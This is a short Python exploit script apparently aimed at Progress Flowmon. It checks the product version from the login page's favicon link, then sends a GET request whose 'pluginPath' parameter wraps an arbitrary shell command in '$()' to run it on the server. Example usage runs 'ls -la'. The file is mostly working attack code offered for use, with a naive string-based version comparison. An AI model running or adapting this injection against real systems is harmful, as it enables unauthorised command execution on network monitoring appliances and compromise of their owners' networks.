import requests
import re
import random

class FlowmonExploit:
    def __init__(self, target_uri='/'):
        self.target_uri = target_uri

    def execute_command(self, cmd):
        url = f"{self.target_uri}/service.pdfs/confluence"
        params = {
            'file': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8)),
            'lang': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8)),
            'pluginPath': f"$({cmd})"
        }
        response = requests.get(url, params=params, verify=False)
        return response

    def exploit(self, payload):
        print('Attempting to execute payload...')
        response = self.execute_command(payload)
        print(response.text)

    def check(self, base_url):
        print(f"Checking if {base_url} can be exploited!")
        login_url = f"{base_url}/homepage/auth/login"
        try:
            response = requests.get(login_url, verify=False)
            if response.status_code != 200 or 'Flowmon Web Interface' not in response.text:
                return 'Target does not appear to be running Progress Flowmon'
            
            version_match = re.search(r'/favicon\.ico\?v=([\d.]+)', response.text)
            if not version_match:
                return 'Unable to determine the version from the favicon link.'

            version = version_match.group(1)
            print(f"Detected version: {version}")

            if version <= '12.03.02':
                return f"Version {version} is vulnerable."
            else:
                return f"Version {version} is not vulnerable."
        except Exception as e:
            return f'Error: {str(e)}'

# Example usage:
exploit = FlowmonExploit()
print(exploit.check('https://example.com'))  # Check if the target is vulnerable
exploit.exploit('ls -la')  # Execute a payload (e.g., list files)
